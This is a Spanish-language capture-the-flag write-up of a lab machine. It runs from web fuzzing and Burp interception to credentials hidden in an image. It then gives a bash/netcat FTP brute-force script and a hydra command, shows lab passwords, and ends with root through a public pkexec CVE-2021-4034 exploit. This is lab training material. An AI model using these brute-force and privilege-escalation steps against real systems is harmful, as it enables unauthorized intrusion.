## (Fuzzing, desactivar javascript del firefox, ruta oculta con burpsuite, obtener credenciales comando strings, hydra y escalada privilegios binarios SUID y PKexec vulnerable)
Haremos el reconocimiento con nmap:
![[Pasted image 20230622202314.png]]
Empezamos analizando el puerto 80 y nos encontramos con una página de apache por defecto:
![[Pasted image 20230622202401.png]]
Hacemos fuzzing y nos encontramos con distintos directorios y nos encuentra assets:
![[Pasted image 20230622202520.png]]
Y tenemos estos archivos:
![[Pasted image 20230622202539.png]]
Si entramos dentro del style.css nos encontramos con que hay un link dentro:
![[Pasted image 20230622202651.png]]
Y nos dice que tenemos que apagar el javascript:
![[Pasted image 20230622202719.png]]
Por tanto procedemos a desactivar el javascript dentro de nuestro navegador; y eso lo hacemos poniendo about:config en la url:
![[Pasted image 20230622202856.png]]
Lo buscamos en el navegador:
![[Pasted image 20230622202938.png]]
Y en la parte de la derecha podemos desactivarlo:
![[Pasted image 20230622202959.png]]
Por tanto ahora volvemos a intentarlo y ya nos carga una web:
![[Pasted image 20230622203027.png]]
Y ahora podemos intentar interceptar esta petición con burpsuite para ver cómo se tramita por detrás, pero con el directorio /sup3r_s3cret_fl4g/:
Y vemos que en burpsuite se nos muestra un directorio oculto:
![[Pasted image 20230622203337.png]]
Si buscamos por este directorio, nos encontramos con una imagen:
![[Pasted image 20230622203408.png]]
Nos bajamos la imagen para analizarla con un wget:
```bash
wget http://10.10.175.24/WExYY2Cv-qU/Hot_Babe.png
```
Y lo leemos en binario con el comando strings y nos encontramos con que en el interior nos dicen quién es el usuario por FTP, que sería ftpuser y una de las siguientes contraseñas:
![[Pasted image 20230622203611.png]]
Vamos filtrar las contraseñas primero mostrando las últimas 150 líneas y a continuación con nano quitamos manualmente las que correspondan para dejar solo las passwords:
![[Pasted image 20230622204425.png]]
Y ahora con hydra hacemos el ataque o con un script de bash:
```bash
#!/bin/bash

ftp_server="10.10.175.24"
ftp_user="ftpuser"
password_file="imagen"
logfile="resultados.log"
ftp_port=21

passwords=$(cat "$password_file")

for password in $passwords; do
  echo "Intentando contraseña: $password"
  output=$(echo -e "USER $ftp_user\r\nPASS $password\r\nQUIT\r\n" | nc -w 2 "$ftp_server" "$ftp_port")

  if echo "$output" | grep -q "230"; then
    echo "Contraseña correcta: $password"
    echo "Contraseña correcta: $password" >> "$logfile"
    exit 0
  fi
done

echo "No se encontró una contraseña válida"
echo "No se encontró una contraseña válida" >> "$logfile"
exit 1
```
Aquí entendemos cómo funciona el comando y por qué se hace un grep de 230, donde se entiende que ha sido exitoso:
![[Pasted image 20230622210519.png]]
E irá comprobando uno a uno, pero va a ir lento:
![[Pasted image 20230622205053.png]]
Si hacemos esta misma comprobación con hydra, va a ir más rápido y podemos encontrarla fácilmente y nos la encontró:
```bash
hydra -l ftpuser -P imagen ftp://10.10.175.24
```
Y vemos que la contraseña es 5iez1wGXKfPKQ
![[Pasted image 20230622205238.png]]
Y nos funciona donde vemos también un archivo con credenciales:
![[Pasted image 20230624102354.png]]
Y si vemos el contenido de este fichero vemos que viene encriptado en un lenguaje que según chatgpt, se llama brainfuck:
![[Pasted image 20230624102556.png]]
![[Pasted image 20230624102607.png]]
Vamos a buscar por internet alguna web para desencriptarlo y vemos que podemos obtener las credenciales de un usuario llamado Eli:
![[Pasted image 20230624102646.png]]
```sql
eli:DSpDiM1wAEwid
```
Y ahora si entramos por ssh ya estramos dentro correctamente:
![[Pasted image 20230624102754.png]]
Vamos a buscar la flag con el comando find, y vemos que está dentro del directorio del usuario gwendoline, pero no tenemos permisos para leerla:
![[Pasted image 20230624102936.png]]

Si hacemos una búsqueda de binarios, vemos que tenemos un binario de pkexec, que quizá tenga una versión vulnerable:
![[Pasted image 20230624103813.png]]
![[Pasted image 20230624103837.png]]
Por tanto vamos a buscar un exploit que pueda escalar privilegios en esta versión, donde vemos que sí:
```bash
https://github.com/mebeim/CVE-2021-4034
```
![[Pasted image 20230624103908.png]]
Seguimos las instrucciones para explotarlo, nos compartimos el exploit y ya somos root:
![[Pasted image 20230624103939.png]]
![[Pasted image 20230624103955.png]]
